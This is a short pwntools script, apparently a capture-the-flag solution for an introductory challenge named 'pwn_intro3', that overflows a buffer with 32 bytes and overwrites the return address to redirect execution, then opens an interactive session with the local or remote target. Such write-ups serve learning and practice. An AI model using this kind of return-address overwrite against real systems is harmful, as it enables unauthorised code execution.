from pwn import *

# True = local debugging 
# False = sending input to remote server
debug = True

if debug == True:
    r = process("./pwn_intro3")
else:
    r = remote("url.tghack.no", 1337)

r.recvuntil("lecture?\n")

new_return_address = "\xb6\x84\x04\x08" #0x080484b6

r.sendline("A" * 32 + new_return_address)

r.interactive()
